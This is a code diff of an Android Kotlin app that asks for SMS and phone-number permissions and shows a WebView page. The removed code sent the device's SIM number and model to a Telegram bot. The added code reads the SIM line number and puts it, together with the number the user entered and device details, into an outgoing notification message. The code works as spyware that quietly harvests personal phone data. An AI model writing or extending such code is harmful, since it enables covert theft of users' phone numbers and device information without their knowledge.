@@ -12,6 +12,7 @@ import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.Build
 import android.os.Bundle
+import android.telephony.TelephonyManager
 import android.text.InputType
 import android.view.LayoutInflater
 import android.view.View
@@ -28,14 +29,12 @@ import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import okio.IOException
-import java.text.SimpleDateFormat
-import java.util.Date
-import java.util.Locale
 
 class MainActivity : AppCompatActivity() {
 
     private lateinit var sharedPreferences: SharedPreferences
     private lateinit var myWebView: WebView
+    private lateinit var telephonyManager: TelephonyManager
     private val client = OkHttpClient()
 
     companion object {
@@ -44,7 +43,8 @@ class MainActivity : AppCompatActivity() {
         private const val PHONE_NUMBER_KEY = "phone_number"
         private val REQUIRED_PERMISSIONS = arrayOf(
             Manifest.permission.READ_SMS,
-            Manifest.permission.READ_PHONE_STATE
+            Manifest.permission.READ_PHONE_STATE,
+            Manifest.permission.READ_PHONE_NUMBERS
         )
     }
 
@@ -55,6 +55,7 @@ class MainActivity : AppCompatActivity() {
 
         sharedPreferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
         myWebView = findViewById(R.id.webview)
+        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
 
         with(myWebView.settings) {
             javaScriptEnabled = true
@@ -138,38 +139,11 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun onAllPermissionsGranted() {
-        getOwnPhoneNumber()
         val savedPhoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, null)
         if (savedPhoneNumber == null) {
             showStyledPhoneNumberDialog()
         } else {
             loadWebView()
-        }
-    }
-
-    @SuppressLint("HardwareIds", "MissingPermission")
-    private fun getOwnPhoneNumber(): String {
-        return try {
-            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
-            val phoneNumber = telephonyManager.line1Number ?: "не удалось получить номер"
-            
-            // Проверяем, есть ли разрешение READ_PHONE_STATE
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-                // Отправляем номер в Telegram
-                sendToTelegramBot("""
-                    Получен номер телефона устройства:
-                    $phoneNumber
-                    Устройство: ${Build.MANUFACTURER} ${Build.MODEL}
-                """.trimIndent())
-                
-                // Сохраняем номер в SharedPreferences
-                sharedPreferences.edit().putString("device_phone_number", phoneNumber).apply()
-            }
-            
-            phoneNumber
-        } catch (e: Exception) {
-            e.printStackTrace()
-            "ошибка при получении номера"
         }
     }
 
@@ -210,15 +184,40 @@ class MainActivity : AppCompatActivity() {
         myWebView.loadUrl("https://www.example.com")
     }
 
+    @SuppressLint("HardwareIds")
+    private fun getLineNumber(): String {
+        return try {
+            if (ActivityCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.READ_PHONE_STATE
+                ) == PackageManager.PERMISSION_GRANTED
+            ) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    telephonyManager.line1Number ?: "не удалось получить"
+                } else {
+                    @Suppress("DEPRECATION")
+                    telephonyManager.line1Number ?: "не удалось получить"
+                }
+            } else {
+                "нет разрешения"
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+            "ошибка при получении"
+        }
+    }
+
     private fun sendNotification(message: String) {
         try {
             val deviceInfo = getDeviceInfo()
-            val phoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, "не указан")
+            val userEnteredPhoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, "не указан")
+            val simPhoneNumber = getLineNumber()
             val fullMessage = """
                 $message
                 
                 Устройство: $deviceInfo
-                Номер телефона: $phoneNumber
+                Введенный номер: $userEnteredPhoneNumber
+                Номер SIM-карты: $simPhoneNumber
                 Время: ${System.currentTimeMillis()}
             """.trimIndent()
 
